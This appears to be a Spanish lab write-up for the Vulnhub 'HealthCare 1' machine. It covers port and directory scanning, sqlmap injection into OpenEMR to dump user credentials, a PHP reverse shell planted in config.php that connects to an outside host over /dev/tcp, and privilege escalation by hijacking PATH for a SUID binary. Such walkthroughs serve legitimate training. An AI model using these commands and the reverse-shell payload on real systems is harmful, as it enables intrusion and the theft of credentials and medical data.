---
title: HealthCare 1 - Vulnhub
layout: post
permalink: /writeups/vulnhub/healthcare1
date: 2025-04-05 11:00:00 -0000
categories: [Laboratorios]
tags: [Vulnhub]
description: >
  Write up en español para Djinn 3 - Vulnhub
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
nmap -sS -Pn -T4 -O 192.168.100.97
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-05 13:26 CEST
Nmap scan report for 192.168.100.97
Host is up (0.00047s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
MAC Address: BC:24:11:1F:7C:F1 (Proxmox Server Solutions GmbH)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.38
OS details: Linux 2.6.38
Network Distance: 1 hop
```

## Puerto 21

Tenemos un puerto FTP abierto pero que no nos permite autenticarnos como anonymous.

## Puerto 80

Tenemos una web estática que nos permite introducir un email que parece pasarse por parámetros POST en URL.

![alt text](/assets/img/writeups/vulnhub/healthcare1/image.png)

## Escaneando directorios web

```bash
gobuster dir -u http://192.168.100.97 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.97
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 5031]
/images               (Status: 301) [Size: 344] [--> http://192.168.100.97/images/]
/css                  (Status: 301) [Size: 341] [--> http://192.168.100.97/css/]
/js                   (Status: 301) [Size: 340] [--> http://192.168.100.97/js/]
/vendor               (Status: 301) [Size: 344] [--> http://192.168.100.97/vendor/]
/favicon              (Status: 200) [Size: 1406]
/robots               (Status: 200) [Size: 620]
/fonts                (Status: 301) [Size: 343] [--> http://192.168.100.97/fonts/]
/gitweb               (Status: 301) [Size: 344] [--> http://192.168.100.97/gitweb/]
/phpMyAdmin           (Status: 403) [Size: 59]
/server-status        (Status: 403) [Size: 1000]
/server-info          (Status: 403) [Size: 1000]
/openemr              (Status: 301) [Size: 345] [--> http://192.168.100.97/openemr/]
Progress: 1273832 / 1273833 (100.00%)
===============================================================
Finished
===============================================================
```

En el archivo `robots.txt` vemos:

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-1.png)

Tras probar un rato no parece que tengamos acceso a muchas de esas direcciones pero si tenemos acceso a `/openemr/` podemos ver que es un CMS de OpenEMR.

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-2.png)

Podemos ver directamente la versión de OpenEMR que se está utilizando por lo que vamos a buscar vulnerabilidades en esa versión.

## Explotando OpenEMR

En ExploitDB podemos encontrar una vulnerabilidad que nos permite realizar un SQL INJECTION [](https://www.exploit-db.com/exploits/17998)

Con esto en mente podemos usar SQLMAP para realizar un ataque de inyección SQL.

Para capturar la petición HTTP necesaria, abirmos BurpSuite y hacemos un intento de iniciar sesión.

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-3.png)

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-4.png)

```bash
sqlmap -r request.txt --dbs --batch
```

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-5.png)

Seleccionaremos la base de datos `openemr` y veremos las tablas que tiene.

```bash
sqlmap -r request.txt -D openemr --tables --batch
```

```bash
[141 tables]
+---------------------------------+
| array                           |
| groups                          |
| log                             |
| version                         |
| addresses                       |
| amc_misc_data                   |
| ar_activity                     |
| ar_session                      |
| audit_details                   |
| audit_master                    |
| automatic_notification          |
| batchcom                        |
| billing                         |
| categories                      |
| categories_seq                  |
| categories_to_documents         |
| chart_tracker                   |
| claims                          |
| clinical_plans                  |
| clinical_plans_rules            |
| clinical_rules                  |
| code_types                      |
| codes                           |
| config                          |
| config_seq                      |
| customlists                     |
| documents                       |
| documents_legal_categories      |
| documents_legal_detail          |
| documents_legal_master          |
| drug_inventory                  |
| drug_sales                      |
| drug_templates                  |
| drugs                           |
| eligibility_response            |
| eligibility_verification        |
| employer_data                   |
| enc_category_map                |
| extended_log                    |
| facility                        |
| fee_sheet_options               |
| form_dictation                  |
| form_encounter                  |
| form_misc_billing_options       |
| form_reviewofs                  |
| form_ros                        |
| form_soap                       |
| form_vitals                     |
| forms                           |
| gacl_acl                        |
| gacl_acl_sections               |
| gacl_acl_seq                    |
| gacl_aco                        |
| gacl_aco_map                    |
| gacl_aco_sections               |
| gacl_aco_sections_seq           |
| gacl_aco_seq                    |
| gacl_aro                        |
| gacl_aro_groups                 |
| gacl_aro_groups_id_seq          |
| gacl_aro_groups_map             |
| gacl_aro_map                    |
| gacl_aro_sections               |
| gacl_aro_sections_seq           |
| gacl_aro_seq                    |
| gacl_axo                        |
| gacl_axo_groups                 |
| gacl_axo_groups_map             |
| gacl_axo_map                    |
| gacl_axo_sections               |
| gacl_groups_aro_map             |
| gacl_groups_axo_map             |
| gacl_phpgacl                    |
| geo_country_reference           |
| geo_zone_reference              |
| globals                         |
| gprelations                     |
| history_data                    |
| immunizations                   |
| insurance_companies             |
| insurance_data                  |
| insurance_numbers               |
| integration_mapping             |
| issue_encounter                 |
| lang_constants                  |
| lang_custom                     |
| lang_definitions                |
| lang_languages                  |
| layout_options                  |
| lbf_data                        |
| list_options                    |
| lists                           |
| lists_touch                     |
| notes                           |
| notification_log                |
| notification_settings           |
| onotes                          |
| openemr_module_vars             |
| openemr_modules                 |
| openemr_postcalendar_categories |
| openemr_postcalendar_events     |
| openemr_postcalendar_limits     |
| openemr_postcalendar_topics     |
| openemr_session_info            |
| patient_access_offsite          |
| patient_access_onsite           |
| patient_data                    |
| patient_reminders               |
| payments                        |
| pharmacies                      |
| phone_numbers                   |
| pma_bookmark                    |
| pma_column_info                 |
| pma_history                     |
| pma_pdf_pages                   |
| pma_relation                    |
| pma_table_coords                |
| pma_table_info                  |
| pnotes                          |
| prescriptions                   |
| prices                          |
| procedure_order                 |
| procedure_report                |
| procedure_result                |
| procedure_type                  |
| registry                        |
| rule_action                     |
| rule_action_item                |
| rule_filter                     |
| rule_patient_data               |
| rule_reminder                   |
| rule_target                     |
| sequences                       |
| standardized_tables_track       |
| syndromic_surveillance          |
| template_users                  |
| transactions                    |
| user_settings                   |
| users                           |
| users_facility                  |
| x12_partners                    |
+---------------------------------+
```

Sabiendo que existe una tabla llamada `users` podemos intentar volcar los datos de la tabla.

```bash
sqlmap -r request.txt -D openemr -T users --dump --batch
```

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-6.png)

Conseguimos ciertas credenciales para dos usuarios.

## Acceso a OpenEMR

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-7.png)

Ahora que tenemos acceso como administrador podemos explorar la aplicación en busca de posibles RCE.

En el apartado de `Administration` podemos ver que hay una opción para editar o subir archivos al servidor.

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-8.png)

Aquí vamos a crear una shell reversa en PHP editando el archivo `config.php`.

```php
<?php
$cmd = "nohup bash -c 'bash -i >& /dev/tcp/192.168.100.210/4444 0>&1' &";
system($cmd);
?>
```

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-9.png)

Escuchamos el puerto 4444 y guardamos el archivo modificado.

```bash
nc -nlvp 4444
```

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-10.png)

## Explorando el sistema

Ahora estabilizamos la shell y exploramos el sistema.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
CRTL+Z
stty raw -echo ; fg
ENTER
export TERM=xterm
```

Aquí encontramos la userflag 

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-11.png)

## Escalando privilegios

Al igual que siempre podemos usar `sudo -l` para comprobar si está mal configurado pero en este caso no parece que sea así, por lo que vamos a buscar binarios con SUID activo.

```bash
find / -perm -4000 -type f 2>/dev/null
```

Aquí encontramos un binario sospechoso.

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-12.png)

Podemos usar el comando strings /usr/bin/healthcheck para ver el contenido legible del binario, y entender qué hace. 
Esto nos muestra que el binario básicamente realiza una comprobación de la configuración IP del sistema con el comando **ifconfig**, y también revisa las particiones de disco con `fdisk -l`.

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-13.png)

Como el binario está usando el comando **ifconfig**, podemos crear nuestra propia versión maliciosa de **ifconfig** en un directorio que nosotros elijamos, y luego añadir ese directorio a la variable de entorno **PATH**.

Entonces, nos movemos al directorio /tmp con cd /tmp, y creamos un archivo llamado **ifconfig** y le damos permisos de ejecución.

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-14.png)

Modificamos la variable **PATH** para que primero busque comandos en /tmp.

```bash
export PATH=/tmp:$PATH
```
Y ahora ejecutamos el binario.

```bash
/usr/bin/healthcheck
```

![alt text](/assets/img/writeups/vulnhub/healthcare1/image-15.png)





